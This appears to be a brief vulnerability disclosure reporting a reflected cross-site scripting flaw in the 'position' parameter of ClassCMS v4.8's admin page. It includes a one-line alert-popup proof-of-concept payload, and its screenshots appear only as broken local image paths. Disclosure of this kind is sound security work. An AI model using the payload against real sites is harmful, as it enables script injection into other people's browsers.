#### BUG_AUTHOR:acmglz
# Classcms Reflected xss exists in the background column management
## Download address:
https://github.com/ClassCMS/ClassCMS/releases/tag/v4.8
## Version:V4.8
## Tested on: PHP, Apache, MySQL
## Affected Page:
/index.php/admin

On this page, position parameter is vulnerable to reflected XSS Attack 
## Proof of vulnerability:
## Payload：
```
<img src=1 onerror=alert(/222/)>
```
## Trigger popup：
![image-20240823163707205](/C:/Users/qaz/AppData/Roaming/Typora/typora-user-images/image-20240823163707205.png)

This page can be triggered after being modified

![image-20240823163729151](/C:/Users/qaz/AppData/Roaming/Typora/typora-user-images/image-20240823163729151.png)

![image-20240823163737644](/C:/Users/qaz/AppData/Roaming/Typora/typora-user-images/image-20240823163737644.png)
